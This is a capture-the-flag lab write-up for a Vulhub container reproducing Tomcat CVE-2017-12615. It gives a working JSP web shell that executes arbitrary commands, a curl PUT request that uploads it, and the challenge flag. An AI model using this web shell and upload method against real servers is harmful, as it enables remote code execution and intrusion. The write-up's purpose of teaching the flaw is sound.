# Challenge 7: Tom & Jerry

## How to Start
```bash
docker compose pull
docker compose up -d
```

---

## Description
This challenge demonstrates how to upload a malicious payload to a vulnerable Apache Tomcat server in order to gain **remote shell access**.

---

## Solution

### 1. Create `shell.jsp`
```jsp
<% 
  if(request.getParameter("cmd") != null) {
    String cmd = request.getParameter("cmd");
    String output = "";
    Process p = Runtime.getRuntime().exec(cmd);
    java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream()));
    String line = null;
    while ((line = reader.readLine()) != null) {
        output += line + "<br>";
    }
    out.println(output);
  }
%>
```

### 2. Upload the Payload
```bash
curl -v -X PUT "http://localhost:8010/shell.jsp/" --data-binary "@shell.jsp" -H "Content-Type: application/octet-stream"
```

### 3. Access the Web Shell
Once uploaded, execute commands through the shell, for example, to retrieve the flag:
```bash
http://localhost:8010/shell.jsp?cmd=cat%20/usr/local/tomcat/webapps/ROOT/flag.txt
```

**Flag:**
```
flag{tomcat_rce_success}
```

---

## How to Recreate

### 1. Clone Vulhub Repository
```bash
git clone https://github.com/vulhub/vulhub
```

### 2. Navigate to the Tomcat CVE Directory
```bash
cd vulhub/tomcat/CVE-2017-12615
```

### 3. Build and Start the Container
```bash
docker compose up -d
```

### 4. Verify in Browser
Visit:
```
http://localhost:<port>
```

### 5. Add the Flag
Enter the container:
```bash
docker exec -it <container_id> /bin/bash
```
Create the flag file:
```bash
echo "flag{tomcat_rce_success}" > /usr/local/tomcat/webapps/ROOT/flag.txt
```

---

## Final Notes
This challenge demonstrates the risk of improperly secured file upload mechanisms and outdated Tomcat configurations, which can allow attackers to upload and execute arbitrary code.
